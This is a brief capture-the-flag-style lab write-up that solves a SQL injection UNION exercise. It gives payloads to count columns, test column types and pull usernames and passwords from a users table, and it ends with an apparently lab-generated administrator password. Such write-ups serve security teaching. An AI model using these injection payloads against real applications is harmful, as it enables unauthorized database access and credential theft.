
Lab: SQL injection UNION attack, retrieving data from other tables

---

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

---

1/ Determine the number of columns

```sql
' UNION SELECT NULL,NULL--
```
 
2/ Determine the data type of columns

```sql
' UNION SELECT 'AAA', 'AAA'--
```

3/ Retrieve data for the table "users" and the columns "username" and "password"

```sql
' UNION SELECT username, password FROM users--
```

```text
administrator
vhjbgmjx58u8j4f36vbi
```

